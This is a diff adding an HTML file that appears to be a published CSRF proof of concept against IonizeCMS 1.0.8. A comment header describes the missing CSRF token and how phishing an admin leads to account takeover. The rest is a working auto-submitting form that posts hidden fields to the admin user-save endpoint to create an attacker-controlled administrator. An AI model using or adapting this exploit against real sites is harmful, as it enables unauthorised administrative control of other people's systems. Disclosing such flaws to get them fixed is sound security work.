@@ -1,0 +1,38 @@
+<!--
+# Exploit Title: IonizeCMS <= 1.0.8 Remote Admin Add CSRF Exploit
+# Exploit Author: s0nk3y
+# Google Dork: -
+# Date: 21/06/2016
+# Vendor Homepage: http://ionizecms.com/
+# Software Link: https://github.com/ionize/ionize/archive/1.0.8.1.zip
+# Version: 1.0.8
+# Tested on: Ubuntu 16.04
+
+IonizeCMS is vulnerable to CSRF attack (No CSRF token in place) meaning
+that if an admin user can be tricked to visit a crafted URL created by
+attacker (via spear phishing/social engineering), a form will be submitted
+to (http://localhost/en/admin/user/save) that will add a
+new user as administrator.
+Once exploited, the attacker can login to the admin panel (
+http://localhost/en/admin/auth/login)
+using the username and the password he posted in the form.
+
+CSRF PoC Code
+=============
+-->
+
+<form method="post" action="http://localhost/en/admin/user/save">   
+<input type="hidden" name="id_user"/>
+<input type="hidden" name="join_date"/>
+<input type="hidden" name="salt"/>
+<input type="hidden" name="from"/>
+<input type="hidden" name="username" value="attacker">
+<input type="hidden" name="screen_name" value="attacker">
+<input type="hidden" name="email" value="attacker@email.com"/>
+<input type="hidden" name="id_role" value="2"/>
+<input type="hidden" name="password" value="attackerPassword"/>
+<input type="hidden" name="password2" value="attackerPassword"/>
+</form>
+<script>
+document.forms[0].submit();
+</script>
